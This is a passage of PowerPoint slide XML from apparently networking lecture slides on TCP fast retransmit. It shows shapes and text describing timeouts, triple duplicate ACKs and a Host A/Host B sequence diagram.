              <a:ext cx="104760" cy="697680"/>
              <a:chOff x="661680" y="2728800"/>
              <a:chExt cx="104760" cy="697680"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="745" name="Line 22"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="709560" y="2728800"/>
                <a:ext cx="0" cy="69768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46" name="Line 23"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="661680" y="2735280"/>
                <a:ext cx="104760" cy="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747" name="Group 24"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="645840" y="4434120"/>
              <a:ext cx="104760" cy="698040"/>
              <a:chOff x="645840" y="4434120"/>
              <a:chExt cx="104760" cy="698040"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="748" name="Line 25"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="703080" y="4434120"/>
                <a:ext cx="0" cy="69804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49" name="Line 26"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="645840" y="5114880"/>
                <a:ext cx="104760" cy="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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="750" name="Group 27"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="802080" y="3109680"/>
            <a:ext cx="2575440" cy="571680"/>
            <a:chOff x="802080" y="3109680"/>
            <a:chExt cx="2575440" cy="571680"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="751" name="Line 28"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="900000" y="3109680"/>
              <a:ext cx="2346120" cy="57168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2" name="CustomShape 29"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1603440" y="3191040"/>
              <a:ext cx="869760" cy="401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3" name="CustomShape 30"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="802080" y="3243240"/>
              <a:ext cx="25754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Seq=100, 20 bytes of data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754" name="Line 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="904680" y="3741480"/>
            <a:ext cx="2324160" cy="1025640"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28440">
            <a:solidFill>
              <a:schemeClr val="accent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55" name="Group 32"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1548360" y="4143240"/>
            <a:ext cx="947520" cy="303480"/>
            <a:chOff x="1548360" y="4143240"/>
            <a:chExt cx="947520" cy="303480"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="756" name="CustomShape 33"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1627200" y="4176720"/>
              <a:ext cx="747360" cy="245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7" name="CustomShape 34"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1548360" y="4143240"/>
              <a:ext cx="94752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ACK=120</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="758" name="Group 35"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="473400" y="1844640"/>
            <a:ext cx="630000" cy="533160"/>
            <a:chOff x="473400" y="1844640"/>
            <a:chExt cx="630000" cy="533160"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="759" name="Picture 85" descr="desktop_computer_stylized_medium"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="473400" y="1844640"/>
              <a:ext cx="630000" cy="533160"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln>
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="760" name="CustomShape 36"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="741600" y="1895760"/>
              <a:ext cx="306000" cy="24372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761" name="Group 37"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3051000" y="1839960"/>
            <a:ext cx="674280" cy="590040"/>
            <a:chOff x="3051000" y="1839960"/>
            <a:chExt cx="674280" cy="590040"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="762" name="Picture 88" descr="desktop_computer_stylized_medium"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill>
            <a:blip r:embed="rId3"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr>
            <a:xfrm>
              <a:off x="3051000" y="1839960"/>
              <a:ext cx="674280" cy="590040"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:ln>
              <a:noFill/>
            </a:ln>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="763" name="CustomShape 38"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3110400" y="1896480"/>
              <a:ext cx="327600" cy="270000"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t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764" name="CustomShape 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2641680" y="651528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6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Shape 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3381480" y="-84240"/>
            <a:ext cx="43430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 cap="all" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>TCP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="25167A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>fast retransmit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Shape 2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EDFA2AE-85C5-4D29-AA37-3BECE98B52ED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22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767" name="Picture 82" descr="underline_base"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3381480" y="808200"/>
            <a:ext cx="3746160" cy="172800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="768" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269120" y="653580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7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769" name="CustomShape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="309600" y="963720"/>
            <a:ext cx="3809520" cy="313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4040" indent="-28368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time-out period  often relatively long:</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="687240" lvl="1" indent="-229680">
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="4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long delay before resending lost packet</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="284040" indent="-283680">
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479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detect lost segments via duplicate ACKs.</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="687240" lvl="1" indent="-229680">
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="4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sender often sends many segments back-to-back</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="687240" lvl="1" indent="-229680">
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="4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if segment is lost, likely to be many duplicate ACKs.</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="770" name="CustomShape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="476280" y="4667400"/>
            <a:ext cx="3509640" cy="2022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  <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>if sender receives 3 ACKs for same data</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRP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  <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>(“triple duplicate ACKs”), resend unacked segment with smallest seq #</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="85000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000099"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Gill Sans MT"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>likely lost, so don</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Gill Sans MT"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Gill Sans MT"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>t wait for timeout</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2000" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="771" name="CustomShape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="476280" y="4498920"/>
            <a:ext cx="3509640" cy="2190240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19080">
            <a:solidFill>
              <a:srgbClr val="CC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2" name="CustomShape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="431280" y="4264200"/>
            <a:ext cx="3126960" cy="45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i="1" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
                <a:ea typeface="ＭＳ Ｐゴシック"/>
              </a:rPr>
              <a:t>TCP fast retransmit</a:t>
            </a:r>
            <a:endParaRPr lang="nl-NL" sz="2400" b="0" strike="noStrike" spc="-1">
              <a:latin typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="773" name="Group 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5032800" y="1081080"/>
            <a:ext cx="3602520" cy="5485680"/>
            <a:chOff x="5032800" y="1081080"/>
            <a:chExt cx="3602520" cy="5485680"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="774" name="Line 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5506920" y="2260440"/>
              <a:ext cx="2533680" cy="59040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5" name="Line 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5506920" y="2489040"/>
              <a:ext cx="1757160" cy="41436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6" name="Line 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="5503680" y="1955520"/>
              <a:ext cx="3240" cy="39942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7" name="Line 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8021520" y="2031840"/>
              <a:ext cx="11160" cy="390348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8" name="Line 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="5470200" y="2903400"/>
              <a:ext cx="2519640" cy="80964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9" name="Line 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5506920" y="2717640"/>
              <a:ext cx="2533680" cy="59040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0" name="Line 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5506920" y="3174840"/>
              <a:ext cx="2533680" cy="59040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1" name="Line 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5506920" y="2946240"/>
              <a:ext cx="2533680" cy="59040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2" name="Line 17"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="5472000" y="3327120"/>
              <a:ext cx="2530440" cy="83052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3" name="Line 18"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="5506920" y="3555720"/>
              <a:ext cx="2506680" cy="88740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4" name="Line 19"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm flipH="1">
              <a:off x="5506920" y="3784320"/>
              <a:ext cx="2495520" cy="90036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5" name="CustomShape 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7180200" y="2655720"/>
              <a:ext cx="282240" cy="4561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X</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="2400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="786" name="Line 21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5532120" y="4725720"/>
              <a:ext cx="2533680" cy="590760"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:ln w="28440">
              <a:solidFill>
                <a:schemeClr val="accent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7" name="CustomShape 22"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5032800" y="5927760"/>
              <a:ext cx="3602520" cy="639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fast retransmit after sender </a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri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receipt of triple duplicate ACK</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1800" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="788" name="CustomShape 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7513560" y="1081080"/>
              <a:ext cx="84276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Host B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789" name="CustomShape 24"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5181480" y="1098720"/>
              <a:ext cx="84276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Host A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790" name="CustomShape 25"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5522400" y="2181240"/>
              <a:ext cx="2349720" cy="303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Seq=92, 8 bytes of data</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="791" name="Group 26"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5609520" y="3430440"/>
              <a:ext cx="947520" cy="303480"/>
              <a:chOff x="5609520" y="3430440"/>
              <a:chExt cx="947520" cy="303480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="792" name="CustomShape 27"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5688000" y="3463920"/>
                <a:ext cx="747360" cy="2458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93" name="CustomShape 28"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5609520" y="3430440"/>
                <a:ext cx="947520" cy="303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ACK=100</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                  <a:latin typeface="Calibri"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="794" name="Group 29"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5123520" y="2233440"/>
              <a:ext cx="396360" cy="3524400"/>
              <a:chOff x="5123520" y="2233440"/>
              <a:chExt cx="396360" cy="3524400"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="795" name="CustomShape 30"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="10800000">
                <a:off x="5123520" y="3678480"/>
                <a:ext cx="396360" cy="6886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rot="5400000" vert="vert" wrap="none" lIns="90000" tIns="45000" rIns="90000" bIns="45000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Tahoma"/>
                    <a:ea typeface="ＭＳ Ｐゴシック"/>
                  </a:rPr>
                  <a:t>timeout</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                  <a:latin typeface="Calibri"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="796" name="Group 31"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="5267160" y="2233440"/>
                <a:ext cx="104760" cy="1417680"/>
                <a:chOff x="5267160" y="2233440"/>
                <a:chExt cx="104760" cy="1417680"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="797" name="Line 32"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipV="1">
                  <a:off x="5314680" y="2233440"/>
                  <a:ext cx="0" cy="1417680"/>
                </a:xfrm>
                <a:prstGeom prst="line">
                  <a:avLst/>
                </a:prstGeom>
                <a:ln w="9360">
                  <a:solidFill>
                    <a:schemeClr val="tx1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798" name="Line 33"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5267160" y="2246760"/>
                  <a:ext cx="104760" cy="0"/>
                </a:xfrm>
                <a:prstGeom prst="line">
                  <a:avLst/>
                </a:prstGeom>
                <a:ln w="93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grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="799" name="Group 34"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="5251320" y="4386240"/>
                <a:ext cx="104760" cy="1371600"/>
                <a:chOff x="5251320" y="4386240"/>
                <a:chExt cx="104760" cy="1371600"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="800" name="Line 35"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5314680" y="4386240"/>
                  <a:ext cx="0" cy="1371600"/>
                </a:xfrm>
                <a:prstGeom prst="line">
                  <a:avLst/>
                </a:prstGeom>
                <a:ln w="9360">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                  <a:round/>
                  <a:tailEnd type="triangl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01" name="Line 36"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm flipH="1">
                  <a:off x="5251320" y="5744880"/>
                  <a:ext cx="104760" cy="0"/>
                </a:xfrm>
                <a:prstGeom prst="line">
                  <a:avLst/>
                </a:prstGeom>
                <a:ln w="93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802" name="Group 37"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5620320" y="3741840"/>
              <a:ext cx="947520" cy="303480"/>
              <a:chOff x="5620320" y="3741840"/>
              <a:chExt cx="947520" cy="303480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="803" name="CustomShape 38"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5724360" y="3795840"/>
                <a:ext cx="747360" cy="201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04" name="CustomShape 39"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5620320" y="3741840"/>
                <a:ext cx="947520" cy="303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ACK=100</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                  <a:latin typeface="Calibri"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="805" name="Group 40"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5606280" y="4071960"/>
              <a:ext cx="947520" cy="303480"/>
              <a:chOff x="5606280" y="4071960"/>
              <a:chExt cx="947520" cy="303480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="806" name="CustomShape 41"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5710320" y="4125960"/>
                <a:ext cx="747360" cy="201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07" name="CustomShape 42"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5606280" y="4071960"/>
                <a:ext cx="947520" cy="303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ACK=100</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                  <a:latin typeface="Calibri"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="808" name="Group 43"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5614200" y="4368960"/>
              <a:ext cx="947520" cy="303480"/>
              <a:chOff x="5614200" y="4368960"/>
              <a:chExt cx="947520" cy="303480"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="809" name="CustomShape 44"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5718240" y="4422600"/>
                <a:ext cx="747360" cy="201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10" name="CustomShape 45"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5614200" y="4368960"/>
                <a:ext cx="947520" cy="303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 strike="noStrike" spc="-1">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:latin typeface="Arial"/>
                    <a:ea typeface="ＭＳ Ｐゴシック"/>
                  </a:rPr>
                  <a:t>ACK=100</a:t>
                </a:r>
                <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                  <a:latin typeface="Calibri"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="811" name="CustomShape 46"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5722920" y="2503440"/>
              <a:ext cx="756720" cy="225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2" name="CustomShape 47"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5483520" y="2448000"/>
              <a:ext cx="25754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Seq=100, 20 bytes of data</a:t>
              </a:r>
              <a:endParaRPr lang="nl-NL" sz="1400" b="0" strike="noStrike" spc="-1">
                <a:latin typeface="Calibri"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="813" name="CustomShape 48"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
